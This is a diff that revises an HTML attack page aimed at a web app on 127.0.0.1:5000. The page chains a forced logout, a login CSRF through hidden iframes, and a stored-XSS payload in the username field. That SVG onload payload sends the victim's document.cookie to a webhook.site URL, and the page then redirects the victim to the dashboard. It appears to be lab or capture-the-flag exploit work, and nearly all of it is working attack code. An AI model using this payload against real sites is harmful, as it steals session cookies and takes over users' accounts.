@@ -1,24 +1,31 @@
-  <!doctype html>
+<!doctype html>
   <html>
   <body>
-  <iframe name="stealth" style="display:none"></iframe>
-  <img src="https://127.0.0.1:5000/logout" style="display:none">
+  <iframe id="logoutf" style="display:none"></iframe>
+  <iframe id="loginf" name="loginf" style="display:none"></iframe>
 
-  <form id="f" action="https://127.0.0.1:5000/login" method="POST" target="stealth">
+  <form id="f" action="https://127.0.0.1:5000/login" method="POST" target="loginf">
     <input type="hidden" name="username" id="u">
     <input type="hidden" name="password" value="test123">
   </form>
 
   <script>
-  document.getElementById('u').value =
-    `<svg/onload="location='https://webhook.site/ffcca826-6638-46ab-9ce2-63241fecab9f?c='+encodeURIComponent(document.cookie)">`;
+  document.getElementById("u").value =
+    `<svg/onload="new Image().src='https://webhook.site/ffcca826-6638-46ab-9ce2-63241fecab9f?c='+encodeURIComponent(document.cookie)">`;
 
-  setTimeout(() => {
-    document.getElementById('f').submit();
-    setTimeout(() => {
-      location = 'https://127.0.0.1:5000/dashboard';
-    }, 2000);
-  }, 2000);
+  const logoutf = document.getElementById("logoutf");
+  const loginf = document.getElementById("loginf");
+  const form = document.getElementById("f");
+
+  logoutf.onload = () => {
+    form.submit();
+  };
+
+  loginf.onload = () => {
+    top.location = "https://127.0.0.1:5000/dashboard";
+  };
+
+  logoutf.src = "https://127.0.0.1:5000/logout";
   </script>
   </body>
   </html>
